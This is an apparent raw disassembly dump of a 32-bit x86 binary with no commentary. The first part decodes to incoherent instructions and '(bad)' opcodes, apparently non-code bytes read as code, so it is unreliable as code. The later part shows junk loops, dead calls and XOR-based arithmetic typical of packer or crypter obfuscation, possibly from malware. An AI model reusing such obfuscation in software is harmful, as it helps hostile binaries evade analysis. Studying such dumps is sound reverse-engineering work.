  411c4e:	test   esi,0xb80a1779
  411c54:	scas   al,BYTE PTR es:[edi]
  411c55:	in     al,dx
  411c56:	retf   
  411c57:	rcr    DWORD PTR [edi-0x3cf929ad],0xaf
  411c5e:	icebp  
  411c5f:	jge    0x411be2
  411c61:	mov    bl,0x64
  411c63:	pop    edi
  411c64:	fld    QWORD PTR [eax-0xb]
  411c67:	imul   DWORD PTR ds:0xadaf34d9
  411c6d:	xlat   BYTE PTR ds:[ebx]
  411c6e:	pop    ss
  411c6f:	ret    0xcf7f
  411c72:	fist   WORD PTR [edi-0x1c303fdb]
  411c78:	jle    0x411c94
  411c7a:	call   0x7c9a:0x9b540a99
  411c81:	pop    ebp
  411c82:	xchg   esp,eax
  411c83:	inc    edx
  411c84:	(bad)  
  411c85:	jo     0x411cc8
  411c87:	ss cmc 
  411c89:	mov    ds:0x1718335,al
  411c8e:	mov    BYTE PTR [esi+0x3b0e1edf],dl
  411c94:	fisubr DWORD PTR ds:0x623f5cf7
  411c9a:	sub    eax,0x223899bb
  411c9f:	add    al,0x7
  411ca1:	add    al,0x86
  411ca3:	inc    eax
  411ca4:	ja     0x411ca5
  411ca6:	ds scas al,BYTE PTR es:[edi]
  411ca8:	jg     0x411c90
  411caa:	jg     0x411ce9
  411cac:	jne    0x411cca
  411cae:	lea    ebp,[esi]
  411cb0:	cs xchg ebp,eax
  411cb2:	into   
  411cb3:	pop    ebx
  411cb4:	add    DWORD PTR [ebx],0x58a61d1f
  411cba:	jnp    0x411c7f
  411cbc:	out    0xc4,eax
  411cbe:	push   0xf2035ca5
  411cc3:	call   0xc7ae8c78
  411cc8:	and    DWORD PTR [ecx-0x5c],ebx
  411ccb:	or     al,0x80
  411ccd:	(bad)  
  411cce:	or     al,ch
  411cd0:	xchg   edi,eax
  411cd1:	cmp    BYTE PTR [edx],bh
  411cd3:	push   esi
  411cd4:	push   cs
  411cd5:	xchg   esi,eax
  411cd6:	lds    ebp,FWORD PTR [edi-0x2b]
  411cd9:	mov    cl,BYTE PTR [edx+0x14b74274]
  411cdf:	call   FWORD PTR [ecx-0x23]
  411ce2:	xchg   edi,eax
  411ce3:	mov    esp,0x3064a3a
  411ce8:	jo     0x411cca
  411cea:	mov    dl,0x0
  411cec:	jmp    0x22cc7619
  411cf1:	cld    
  411cf2:	push   0x4234702f
  411cf7:	dec    esp
  411cf8:	sub    edx,DWORD PTR [esi+eiz*8+0xca559b8]
  411cff:	vpminsw ymm6,ymm4,ymm3
  411d03:	mov    WORD PTR [edi],ss
  411d05:	add    eax,DWORD PTR [edx]
  411d07:	mov    esp,DWORD PTR [ebx+0x6a691088]
  411d0d:	mov    ah,0x7d
  411d0f:	cmp    DWORD PTR [edi+0x31f99883],esp
  411d15:	or     eax,DWORD PTR [ebp+0x31]
  411d18:	std    
  411d19:	inc    esi
  411d1a:	pop    eax
  411d1b:	pop    ds
  411d1c:	movhps xmm5,QWORD PTR [eax]
  411d1f:	outs   dx,DWORD PTR ds:[esi]
  411d20:	sar    DWORD PTR [bx],1
  411d23:	mov    ah,0xc9
  411d25:	sub    dh,BYTE PTR [ebx+0x7f]
  411d28:	(bad)  
  411d29:	loop   0x411d9d
  411d2b:	or     edi,ebp
  411d2d:	push   ebx
  411d2e:	inc    edi
  411d2f:	mov    cl,0x7f
  411d31:	dec    esi
  411d32:	inc    esp
  411d33:	jmp    0x411ce4
  411d35:	lahf   
  411d36:	cmp    BYTE PTR ds:0xf826af75,ch
  411d3c:	lds    eax,FWORD PTR ds:0xc3d5ab14
  411d42:	jge    0x411cd5
  411d44:	cmp    eax,0xc039f4b5
  411d49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d4a:	xchg   BYTE PTR [esi+ecx*8],bh
  411d4d:	in     eax,dx
  411d4e:	sahf   
  411d4f:	and    esi,0xa33746bf
  411d55:	clc    
  411d56:	sub    BYTE PTR [ebx],0xb1
  411d59:	outs   dx,BYTE PTR ds:[esi]
  411d5a:	shr    BYTE PTR [edx+0x34],0x44
  411d5e:	sub    al,0xf3
  411d60:	call   0x19cb:0x1a8afb80
  411d67:	pop    ebp
  411d68:	(bad)  
  411d69:	mov    al,0x97
  411d6b:	into   
  411d6c:	mov    ebx,0x5297393e
  411d71:	jge    0x411d67
  411d73:	jnp    0x411db1
  411d75:	pop    es
  411d76:	call   0x749b:0x873ec320
  411d7d:	jge    0x411d55
  411d7f:	pop    eax
  411d80:	or     BYTE PTR [eax+0x1d],dl
  411d83:	xor    DWORD PTR [ebx+ebx*2+0x5e],esi
  411d87:	cwde   
  411d88:	iret   
  411d89:	sub    ah,0x4f
  411d8c:	fwait
  411d8d:	test   al,0x46
  411d8f:	push   ds
  411d90:	into   
  411d91:	jge    0x411dc5
  411d93:	loope  0x411db4
  411d95:	out    0x99,al
  411d97:	mov    edi,0x60e6aed9
  411d9c:	jnp    0x411d63
  411d9e:	jae    0x411d26
  411da0:	sar    dh,cl
  411da2:	and    bl,BYTE PTR [edi+0x16]
  411da5:	mov    es,WORD PTR [eax+eiz*2-0x1]
  411da9:	jp     0x411dba
  411dab:	adc    eax,0x3f4f5ca2
  411db0:	stc    
  411db1:	adc    al,0x61
  411db3:	xchg   esi,eax
  411db4:	mov    cl,0xef
  411db6:	popf   
  411db7:	mov    WORD PTR [ecx+0x3e8a4900],es
  411dbd:	xchg   ebp,eax
  411dbe:	sbb    BYTE PTR [edi-0x7e],bh
  411dc1:	adc    bh,BYTE PTR [esi-0x13d7bd6b]
  411dc7:	jmp    0x6108d49f
  411dcc:	xor    ch,BYTE PTR [esi+ebp*1]
  411dcf:	add    ah,BYTE PTR [ebp+0x4c49d98f]
  411dd5:	shl    BYTE PTR [esp+ebx*8+0x268f4395],cl
  411ddc:	(bad)  
  411ddd:	jae    0x411df9
  411ddf:	mov    BYTE PTR fs:[di-0x71],cl
  411de4:	pusha  
  411de5:	xor    eax,0xfa5de0e1
  411dea:	lds    esp,FWORD PTR [esi]
  411dec:	call   0x2766f109
  411df1:	lahf   
  411df2:	popa   
  411df3:	xchg   ebx,eax
  411df4:	aas    
  411df5:	mov    ebx,0x1eb3c8fa
  411dfa:	popa   
  411dfb:	enter  0xb0a8,0x95
  411dff:	cmp    BYTE PTR [edx-0x19dc41b4],0x3c
  411e06:	add    BYTE PTR [edi+0x56],dl
  411e09:	out    dx,eax
  411e0a:	xchg   ebx,eax
  411e0b:	lods   al,BYTE PTR ds:[esi]
  411e0c:	scas   eax,DWORD PTR es:[edi]
  411e0d:	or     cl,0x3d
  411e10:	add    al,0x78
  411e12:	(bad)  
  411e13:	and    al,0xe7
  411e15:	leave  
  411e16:	pop    esp
  411e17:	pop    esp
  411e18:	in     al,0x8d
  411e1a:	js     0x411dab
  411e1c:	fist   DWORD PTR es:[eax]
  411e1f:	mov    eax,fs:0xa7db3fd2
  411e25:	push   eax
  411e26:	ror    bh,cl
  411e28:	ret    0x5dff
  411e2b:	(bad)  
  411e2c:	nop
  411e2d:	loop   0x411e35
  411e2f:	cli    
  411e30:	(bad)  
  411e31:	sbb    DWORD PTR [ebp+0x57],edx
  411e34:	inc    eax
  411e35:	iret   
  411e36:	lods   eax,DWORD PTR ds:[esi]
  411e37:	sbb    bl,BYTE PTR ds:0xed45f861
  411e3d:	add    ebx,esi
  411e3f:	or     esp,DWORD PTR [eax+0x6115d07]
  411e45:	ficom  DWORD PTR [eax-0x4c43d76e]
  411e4b:	adc    al,BYTE PTR [ebx+0x7a]
  411e4e:	out    dx,al
  411e4f:	and    DWORD PTR [esi+0x5115b4f0],eax
  411e55:	les    edi,FWORD PTR [eax-0x2ba79c79]
  411e5b:	repz dec edx
  411e5d:	repz push esi
  411e5f:	out    dx,eax
  411e60:	or     al,0x87
  411e62:	lock ror BYTE PTR [ebp+0x177fc12d],cl
  411e69:	xchg   cl,al
  411e6b:	shl    DWORD PTR [ecx],cl
  411e6d:	leave  
  411e6e:	retf   
  411e6f:	add    edx,DWORD PTR [eax]
  411e71:	push   es
  411e72:	enter  0xbd97,0x96
  411e76:	mov    cl,BYTE PTR [eax-0x44bfb8b7]
  411e7c:	mov    esi,eax
  411e7e:	mov    BYTE PTR [eax-0x7a5b3879],0x3b
  411e85:	sub    BYTE PTR [ebx+ebp*2],0xae
  411e89:	lea    ebx,[edi]
  411e8b:	or     ecx,DWORD PTR [esp+0x21310f11]
  411e92:	stos   DWORD PTR es:[edi],eax
  411e93:	out    0xea,al
  411e95:	loopne 0x411e8a
  411e97:	cwde   
  411e98:	ffreep st(3)
  411e9a:	dec    ebx
  411e9b:	fnstcw WORD PTR [ebp-0x5bed63f6]
  411ea1:	cdq    
  411ea2:	sbb    al,0xd3
  411ea4:	enter  0x62b8,0xce
  411ea8:	adc    BYTE PTR [ebx+eiz*4-0x32],0x47
  411ead:	add    ebx,DWORD PTR [eax+0x31]
  411eb0:	div    ch
  411eb2:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  411eb4:	repnz ror DWORD PTR [ebp+0x6],1
  411eb8:	jmp    0xf746312c
  411ebd:	in     eax,dx
  411ebe:	aas    
  411ebf:	fidivr DWORD PTR [edi]
  411ec1:	sar    BYTE PTR [esi+0x50f2575b],0xfb
  411ec8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ec9:	lods   al,BYTE PTR ds:[esi]
  411eca:	cdq    
  411ecb:	and    cl,BYTE PTR [ecx+0xf]
  411ece:	es pop ecx
  411ed0:	dec    ecx
  411ed1:	mov    edi,0x8b344b8b
  411ed6:	xchg   BYTE PTR [edx],cl
  411ed8:	out    dx,al
  411ed9:	pop    ss
  411eda:	ins    BYTE PTR es:[edi],dx
  411edb:	mov    esi,0xd466d9fb
  411ee0:	dec    eax
  411ee1:	out    0x5f,eax
  411ee3:	ss add eax,0x86732f62
  411ee9:	pop    ebp
  411eea:	inc    eax
  411eeb:	push   es
  411eec:	das    
  411eed:	pop    edi
  411eee:	dec    ecx
  411eef:	sbb    eax,0xb63cafd1
  411ef4:	shr    BYTE PTR [esp+edx*1-0x75],0xb7
  411ef9:	jbe    0x411f22
  411efb:	jmp    0x411eee
  411efd:	mov    ds:0xc5c21a40,al
  411f02:	sbb    BYTE PTR [esi],dl
  411f04:	test   eax,eax
  411f06:	jp     0x411f3b
  411f08:	sti    
  411f09:	cwde   
  411f0a:	out    dx,al
  411f0b:	fidivr DWORD PTR [edi+esi*2-0x37e8d002]
  411f12:	cmp    ah,BYTE PTR [ecx]
  411f14:	jne    0x411f2d
  411f16:	push   edx
  411f17:	(bad)  
  411f19:	nop
  411f1a:	xchg   edi,eax
  411f1c:	mov    ds:0xc95fe9fd,al
  411f21:	iret   
  411f22:	popa   
  411f23:	test   al,0xe2
  411f25:	push   eax
  411f26:	cwde   
  411f27:	arpl   WORD PTR [eax+0x4],bp
  411f2a:	lods   al,BYTE PTR ds:[esi]
  411f2b:	jae    0x411f73
  411f2d:	rcr    DWORD PTR [eax+0x4a7f45dd],0x61
  411f34:	pop    es
  411f35:	ror    dl,1
  411f37:	ja     0x411f2d
  411f39:	sbb    ebp,DWORD PTR [esi]
  411f3b:	jae    0x411ec6
  411f3d:	mov    dl,0x73
  411f3f:	(bad)  
  411f40:	xor    DWORD PTR ds:0x4c98391e,eax
  411f46:	je     0x411ed2
  411f48:	leave  
  411f49:	push   es
  411f4a:	mov    dl,0x83
  411f4c:	imul   edx,ebx,0xfdf11687
  411f52:	addr16 mov ch,0x7c
  411f55:	jbe    0x411fcb
  411f57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f58:	rol    DWORD PTR [edi+0x134ac0af],1
  411f5e:	ins    BYTE PTR es:[edi],dx
  411f5f:	push   esi
  411f60:	test   DWORD PTR [esi],edx
  411f62:	sub    al,0x14
  411f64:	popf   
  411f65:	jmp    0x31a724f
  411f6a:	imul   ecx,DWORD PTR [ebx+0x32],0x4c141c09
  411f71:	dec    ebp
  411f72:	adc    ch,dl
  411f74:	add    eax,0x681f93dd
  411f79:	retf   
  411f7a:	mov    esi,0xbd22b24e
  411f7f:	sbb    al,0x6
  411f81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f82:	sbb    al,0x17
  411f84:	loope  0x411f2f
  411f86:	out    dx,al
  411f87:	ds je  0x411fdc
  411f8a:	inc    ebx
  411f8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f8c:	jle    0x411f83
  411f8e:	inc    esi
  411f8f:	inc    edx
  411f90:	jp     0x411ff8
  411f92:	mov    ds:0x9ffcd6d5,al
  411f97:	push   ebx
  411f98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f99:	fmul   QWORD PTR [edi]
  411f9b:	sbb    al,0x53
  411f9d:	sar    BYTE PTR [esi+0x44a5322c],cl
  411fa3:	frstor [edx+0x1a57b2f4]
  411fa9:	add    eax,0xfd88a00
  411fae:	cmp    dl,BYTE PTR [ecx+ecx*4-0x6024d4ea]
  411fb5:	gs jo  0x411fe3
  411fb8:	pop    ebp
  411fb9:	jge    0x41202e
  411fbb:	and    ecx,edi
  411fbd:	(bad)  
  411fbe:	xlat   BYTE PTR ds:[ebx]
  411fbf:	shr    BYTE PTR [edi],1
  411fc1:	push   ds
  411fc2:	dec    edi
  411fc3:	bound  eax,QWORD PTR [eax]
  411fc5:	dec    ebp
  411fc6:	add    ecx,DWORD PTR [edx+0x11]
  411fc9:	loope  0x41203a
  411fcb:	popa   
  411fcc:	push   ss
  411fcd:	fist   DWORD PTR [ecx]
  411fcf:	cld    
  411fd0:	add    DWORD PTR [eax+eiz*8],esi
  411fd3:	jmp    DWORD PTR [eax+0x62]
  411fd6:	into   
  411fd7:	xchg   edi,eax
  411fd8:	popa   
  411fd9:	cmp    DWORD PTR [esp+esi*1+0x4b],edi
  411fdd:	neg    DWORD PTR [ecx-0x64]
  411fe0:	ret    
  411fe1:	fwait
  411fe2:	ret    0xe5d4
  411fe5:	xchg   edi,ebp
  411fe7:	das    
  411fe8:	adc    bl,bh
  411fea:	enter  0x861e,0x6b
  411fee:	clc    
  411fef:	push   es
  411ff0:	cdq    
  411ff1:	add    al,0x8f
  411ff3:	xchg   esi,eax
  411ff4:	sub    ch,dh
  411ff6:	inc    edi
  411ff7:	adc    DWORD PTR [eax],esi
  411ff9:	out    0xd9,al
  411ffb:	dec    edx
  411ffc:	jmp    0x985b8c82
  412001:	add    DWORD PTR [ecx],edi
  412003:	pop    ecx
  412004:	dec    edi
  412005:	cmp    eax,0x970b3935
  41200a:	out    dx,eax
  41200b:	xor    al,0x39
  41200d:	and    dl,BYTE PTR [ebp+eiz*4-0x296fb5f0]
  412014:	cdq    
  412015:	pop    ebp
  412016:	fdivr  DWORD PTR [edx-0xb]
  412019:	push   edi
  41201a:	xchg   ebx,eax
  41201b:	push   ebx
  41201c:	out    0xe1,eax
  41201e:	cmp    eax,0x32307fdf
  412023:	call   0x47d66dc6
  412028:	xchg   ecx,eax
  412029:	and    eax,edx
  41202b:	in     eax,dx
  41202c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41202d:	ss in  eax,0x52
  412030:	pop    esi
  412031:	scas   al,BYTE PTR es:[di]
  412033:	ss (bad) 
  412035:	cmp    al,0x3
  412037:	shr    cl,0x9b
  41203a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41203b:	cli    
  41203c:	mov    dl,ah
  41203e:	retf   
  41203f:	gs jl  0x412094
  412042:	cmp    BYTE PTR [ebx+ebp*2+0x4a],bh
  412046:	and    DWORD PTR [eax+edi*4-0x7d679d73],0x5a
  41204e:	mov    eax,ds:0xfc9ff621
  412053:	mov    DWORD PTR [edi-0x4cf6943f],edx
  412059:	rcr    edi,0x85
  41205c:	push   eax
  41205d:	xor    bl,dh
  41205f:	aam    0xbd
  412061:	inc    ebp
  412062:	iret   
  412063:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412064:	ficomp DWORD PTR [esi]
  412066:	fisttp WORD PTR [ebx]
  412068:	das    
  412069:	inc    edi
  41206a:	aas    
  41206b:	or     ebx,eax
  41206d:	call   0xce4e5f77
  412072:	pop    ecx
  412073:	sub    eax,0x95343880
  412078:	imul   esi,DWORD PTR [si+0x3c],0xffffffbb
  41207d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41207e:	data16 das 
  412080:	jne    0x412038
  412082:	add    eax,0x4149e02d
  412087:	std    
  412088:	xor    eax,0xbafcf69a
  41208d:	mov    ds:0xff439007,al
  412092:	mov    fs,WORD PTR es:[esi+edi*2]
  412096:	push   ecx
  412097:	(bad)  
  412098:	mov    ecx,0x516c4048
  41209d:	cli    
  41209e:	rcr    BYTE PTR [ebx+0x42],cl
  4120a1:	bound  ecx,QWORD PTR [edx-0x54]
  4120a4:	aaa    
  4120a5:	xchg   DWORD PTR [esi],esp
  4120a7:	shl    esi,1
  4120a9:	dec    ebx
  4120aa:	push   0xdc738453
  4120af:	push   es
  4120b0:	iret   
  4120b1:	push   ebp
  4120b2:	xor    eax,0x30c931e1
  4120b7:	in     eax,dx
  4120b8:	ss icebp 
  4120ba:	sti    
  4120bb:	test   DWORD PTR [ecx-0x2c],0x5ed60955
  4120c2:	xor    eax,0x5d9d8cd3
  4120c7:	hlt    
  4120c8:	xor    bh,bh
  4120ca:	pop    esp
  4120cb:	fadd   st(1),st
  4120cd:	ja     0x4120b1
  4120cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4120d0:	ja     0x4120bf
  4120d2:	pusha  
  4120d3:	cmp    al,0xe1
  4120d5:	hlt    
  4120d6:	int    0x47
  4120d8:	or     ecx,DWORD PTR [edi+0x48]
  4120db:	(bad)  
  4120dc:	repnz push ebx
  4120de:	xor    al,BYTE PTR [ecx+0x596c0e8d]
  4120e4:	imul   esi,DWORD PTR [ecx-0x5c225e0d],0x3d
  4120eb:	out    dx,al
  4120ec:	retf   
  4120ed:	js     0x412154
  4120ef:	and    edx,DWORD PTR [edi+0x8c7ae2e]
  4120f5:	test   DWORD PTR [edi+0x24403d],ebp
  4120fb:	mov    edx,ecx
  4120fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4120fe:	dec    ecx
  4120ff:	stc    
  412100:	mov    edx,0x159a006e
  412105:	ss je  0x4120f1
  412108:	in     eax,0xd7
  41210a:	cmp    BYTE PTR [ebx],ch
  41210c:	fsub   DWORD PTR [ebx]
  41210e:	sbb    dh,ah
  412110:	fs aas 
  412112:	pop    esp
  412113:	sub    esi,DWORD PTR [edx+edx*1+0x20]
  412117:	sbb    eax,0x56864d1d
  41211c:	das    
  41211d:	mov    ch,0x22
  41211f:	or     dh,BYTE PTR [eax]
  412121:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412122:	cmp    DWORD PTR [ebx-0x58],esp
  412125:	mov    eax,0xbf7ef2c4
  41212a:	cmp    al,0x38
  41212c:	int3   
  41212d:	loope  0x412174
  41212f:	hlt    
  412130:	inc    esp
  412131:	sti    
  412132:	gs xchg edx,eax
  412134:	cmp    DWORD PTR [eax+0x4e7efdcd],eax
  41213a:	inc    eax
  41213b:	jl     0x412171
  41213d:	in     eax,dx
  41213e:	dec    ecx
  41213f:	adc    dl,BYTE PTR [edx+esi*8-0x46]
  412143:	xchg   edi,eax
  412144:	adc    ah,bh
  412146:	push   0xb0558995
  41214b:	adc    ebx,ebx
  41214d:	mov    edx,DWORD PTR [ebp+0x8]
  412150:	and    DWORD PTR ds:0x428e8d,0x0
  41215a:	jmp    0x41216c
  41215f:	mov    ebx,DWORD PTR ds:0x428e8d
  412165:	inc    ebx
  412166:	mov    DWORD PTR ds:0x428e8d,ebx
  41216c:	cmp    DWORD PTR ds:0x428e8d,0x1c
  412173:	jae    0x4121a0
  412179:	cmp    DWORD PTR ds:0x428e8d,0x20
  412180:	ja     0x4121a0
  412186:	jmp    0x41219b
  41218b:	push   0x428039
  412190:	push   0x400000
  412195:	call   DWORD PTR ds:0x42ca24
  41219b:	jmp    0x41215f
  4121a0:	mov    ebx,DWORD PTR [ebp-0x4c]
  4121a3:	inc    DWORD PTR ds:0x428e71
  4121a9:	add    edx,ecx
  4121ab:	sbb    DWORD PTR ds:0x428e8d,0x5a59
  4121b5:	or     edx,ebx
  4121b7:	mov    DWORD PTR ds:0x428e55,0x19
  4121c1:	cmp    DWORD PTR ds:0x428e55,0x0
  4121c8:	je     0x4121fb
  4121ce:	cmp    DWORD PTR ds:0x428e55,0x1e
  4121d5:	jle    0x4121fb
  4121db:	jmp    0x4121e9
  4121e0:	push   DWORD PTR [ebp-0x20]
  4121e3:	call   DWORD PTR ds:0x42ca28
  4121e9:	mov    ebx,DWORD PTR ds:0x428e55
  4121ef:	dec    ebx
  4121f0:	mov    DWORD PTR ds:0x428e55,ebx
  4121f6:	jmp    0x4121c1
  4121fb:	mov    DWORD PTR [ebp-0x4c],edx
  4121fe:	add    DWORD PTR ds:0x428eb1,ebx
  412204:	mov    edx,DWORD PTR [ebp+0x8]
  412207:	mov    DWORD PTR ds:0x428ec5,0x16
  412211:	cmp    DWORD PTR ds:0x428ec5,0x0
  412218:	je     0x412267
  41221e:	cmp    DWORD PTR ds:0x428ec5,0xc
  412225:	jl     0x412267
  41222b:	jmp    0x41223b
  412230:	push   0x1fc5
  412235:	call   DWORD PTR ds:0x42ca2c
  41223b:	cmp    DWORD PTR ds:0x428ec5,0xd
  412242:	jne    0x412255
  412248:	mov    ebx,DWORD PTR ds:0x428ec5
  41224e:	dec    ebx
  41224f:	mov    DWORD PTR ds:0x428ec5,ebx
  412255:	mov    ebx,DWORD PTR ds:0x428ec5
  41225b:	dec    ebx
  41225c:	mov    DWORD PTR ds:0x428ec5,ebx
  412262:	jmp    0x412211
  412267:	mov    ebx,0xfdbe0321
  41226c:	add    DWORD PTR ds:0x428eb9,0x428e39
  412276:	sub    ebx,edx
  412278:	add    ebx,DWORD PTR [ebp-0x48]
  41227b:	sbb    edx,DWORD PTR ds:0x428e75
  412281:	mov    DWORD PTR [ebp-0x48],ebx
  412284:	xor    DWORD PTR ds:0x428e9d,edi
  41228a:	mov    edx,DWORD PTR [ebp+0x8]
  41228d:	mov    ebx,DWORD PTR ds:0x428e35
  412293:	sub    DWORD PTR ds:0x428e4d,ebx
  412299:	mov    ebx,DWORD PTR [ebp-0x44]
  41229c:	add    edx,edi
  41229e:	xor    DWORD PTR ds:0x428e7d,0x7f21
  4122a8:	xor    edx,ebx
  4122aa:	mov    DWORD PTR [ebp-0x44],edx
  4122ad:	movzx  edx,BYTE PTR ds:0x428e9d
  4122b4:	adc    DWORD PTR ds:0x428e65,edx
  4122ba:	mov    edx,DWORD PTR [ebp+0x8]
  4122bd:	xor    DWORD PTR ds:0x428e55,0x428ead
  4122c7:	xor    edx,eax
  4122c9:	add    edx,esi
  4122cb:	mov    DWORD PTR ds:0x428e95,0x7e15
  4122d5:	jne    0x40fc55
  4122db:	jmp    0x412616
  4122e0:	mov    edx,DWORD PTR [ebp-0xc]
  4122e3:	inc    ebx
  4122e4:	sub    edx,esi
  4122e6:	movzx  ebx,BYTE PTR ds:0x428ebd
  4122ed:	xor    DWORD PTR ds:0x428ec5,ebx
  4122f3:	xor    edx,eax
  4122f5:	mov    DWORD PTR ds:0x428e31,0x17
  4122ff:	cmp    DWORD PTR ds:0x428e31,0x0
  412306:	je     0x412355
  41230c:	cmp    DWORD PTR ds:0x428e31,0xa
  412313:	jle    0x412355
  412319:	jmp    0x412329
  41231e:	push   0x428059
  412323:	call   DWORD PTR ds:0x42ca30
  412329:	cmp    DWORD PTR ds:0x428e31,0xb
  412330:	jne    0x412343
  412336:	mov    ebx,DWORD PTR ds:0x428e31
  41233c:	dec    ebx
  41233d:	mov    DWORD PTR ds:0x428e31,ebx
  412343:	mov    ebx,DWORD PTR ds:0x428e31
  412349:	dec    ebx
  41234a:	mov    DWORD PTR ds:0x428e31,ebx
  412350:	jmp    0x4122ff
  412355:	mov    DWORD PTR [ebp-0x5c],edx
  412358:	mov    edx,DWORD PTR [ebp-0x10]
  41235b:	mov    ebx,DWORD PTR [ebp-0x8]
  41235e:	xor    DWORD PTR ds:0x428e99,0xf1a
  412368:	xor    edx,eax
  41236a:	xor    ebx,eax
  41236c:	sub    DWORD PTR ds:0x428ebd,0x1998
  412376:	sub    edx,ebx
  412378:	sub    edx,esi
  41237a:	xor    edx,eax
  41237c:	mov    DWORD PTR [ebp-0x10],edx
  41237f:	mov    edx,DWORD PTR [ebp-0x14]
  412382:	mov    DWORD PTR [ebp+0x8],edx
  412385:	jmp    0x4123fa
  41238a:	mov    edx,DWORD PTR [ebp+0x8]
  41238d:	mov    ebx,DWORD PTR [ebp-0x8]
  412390:	xor    edx,eax
  412392:	xor    ebx,eax
  412394:	sub    edx,ebx
  412396:	sub    edx,esi
  412398:	xor    edx,eax
  41239a:	mov    DWORD PTR [ebp+0x8],edx
  41239d:	mov    edx,DWORD PTR [ebp+0x8]
  4123a0:	mov    ebx,DWORD PTR [ebp-0x58]
  4123a3:	lea    edx,[ebx+edx*1+0x5708f8]
  4123aa:	mov    DWORD PTR [ebp-0x58],edx
  4123ad:	mov    edx,DWORD PTR [ebp+0x8]
  4123b0:	mov    ebx,DWORD PTR [ebp-0x54]
  4123b3:	add    edx,0x64f89a
  4123b9:	imul   edx,ebx
  4123bc:	mov    DWORD PTR [ebp-0x54],edx
  4123bf:	mov    edx,DWORD PTR [ebp+0x8]
  4123c2:	mov    ebx,DWORD PTR [ebp-0x50]
  4123c5:	add    edx,0x242ebed
  4123cb:	and    edx,ebx
  4123cd:	mov    DWORD PTR [ebp-0x50],edx
  4123d0:	mov    edx,DWORD PTR [ebp+0x8]
  4123d3:	mov    ebx,DWORD PTR [ebp-0x4c]
  4123d6:	add    edx,ecx
  4123d8:	or     edx,ebx
  4123da:	mov    DWORD PTR [ebp-0x4c],edx
  4123dd:	mov    edx,DWORD PTR [ebp+0x8]
  4123e0:	mov    ebx,0xfdbe0321
  4123e5:	sub    ebx,edx
  4123e7:	add    ebx,DWORD PTR [ebp-0x48]
  4123ea:	mov    DWORD PTR [ebp-0x48],ebx
  4123ed:	mov    edx,DWORD PTR [ebp+0x8]
  4123f0:	mov    ebx,DWORD PTR [ebp-0x44]
  4123f3:	add    edx,edi
  4123f5:	xor    edx,ebx
  4123f7:	mov    DWORD PTR [ebp-0x44],edx
  4123fa:	mov    edx,DWORD PTR [ebp+0x8]
  4123fd:	xor    edx,eax
  4123ff:	add    edx,esi
  412401:	jne    0x41238a
  412407:	mov    edx,DWORD PTR [ebp-0xc]
  41240a:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  412411:	mov    bl,BYTE PTR [ebp-0x1]
  412414:	cmp    dl,bl
  412416:	je     0x4124f4
  41241c:	mov    ecx,DWORD PTR [ebp-0x5c]
  41241f:	mov    edx,DWORD PTR [ebp-0xc]
  412422:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  412429:	mov    ebx,DWORD PTR [ebp+0xc]
  41242c:	xor    ecx,eax
  41242e:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272f8]
  412435:	jne    0x412628
  41243b:	mov    ecx,DWORD PTR [ebp-0x5c]
  41243e:	mov    edx,DWORD PTR [ebp+0xc]
  412441:	xor    ecx,eax
  412443:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272f8]
  41244b:	mov    edx,DWORD PTR [ebp-0x18]
  41244e:	xor    edx,eax
  412450:	add    edx,esi
  412452:	cmp    ecx,edx
  412454:	mov    ecx,DWORD PTR [ebp-0x14]
  412457:	mov    DWORD PTR [ebp+0x8],ecx
  41245a:	mov    ecx,DWORD PTR [ebp+0x8]
  41245d:	je     0x414aa9
  412463:	xor    ecx,eax
  412465:	add    ecx,esi
  412467:	mov    ecx,0xf641bea
  41246c:	je     0x41257c
  412472:	mov    edx,DWORD PTR [ebp+0x8]
  412475:	mov    ebx,DWORD PTR [ebp-0x8]
  412478:	xor    edx,eax
  41247a:	xor    ebx,eax
  41247c:	sub    edx,ebx
  41247e:	sub    edx,esi
  412480:	xor    edx,eax
  412482:	mov    DWORD PTR [ebp+0x8],edx
  412485:	mov    edx,DWORD PTR [ebp+0x8]
  412488:	mov    ebx,DWORD PTR [ebp-0x58]
  41248b:	lea    edx,[ebx+edx*1+0x5708f8]
  412492:	mov    DWORD PTR [ebp-0x58],edx
  412495:	mov    edx,DWORD PTR [ebp+0x8]
  412498:	mov    ebx,DWORD PTR [ebp-0x54]
  41249b:	add    edx,0x64f89a
  4124a1:	imul   edx,ebx
  4124a4:	mov    DWORD PTR [ebp-0x54],edx
  4124a7:	mov    edx,DWORD PTR [ebp+0x8]
  4124aa:	mov    ebx,DWORD PTR [ebp-0x50]
  4124ad:	add    edx,0x242ebed
  4124b3:	and    edx,ebx
  4124b5:	mov    DWORD PTR [ebp-0x50],edx
  4124b8:	mov    edx,DWORD PTR [ebp+0x8]
  4124bb:	mov    ebx,DWORD PTR [ebp-0x4c]
  4124be:	add    edx,ecx
  4124c0:	or     edx,ebx
  4124c2:	mov    DWORD PTR [ebp-0x4c],edx
  4124c5:	mov    edx,DWORD PTR [ebp+0x8]
  4124c8:	mov    ebx,0xfdbe0321
  4124cd:	sub    ebx,edx
  4124cf:	add    ebx,DWORD PTR [ebp-0x48]
  4124d2:	mov    DWORD PTR [ebp-0x48],ebx
  4124d5:	mov    edx,DWORD PTR [ebp+0x8]
  4124d8:	mov    ebx,DWORD PTR [ebp-0x44]
  4124db:	add    edx,edi
  4124dd:	xor    edx,ebx
  4124df:	mov    DWORD PTR [ebp-0x44],edx
  4124e2:	mov    edx,DWORD PTR [ebp+0x8]
  4124e5:	xor    edx,eax
  4124e7:	add    edx,esi
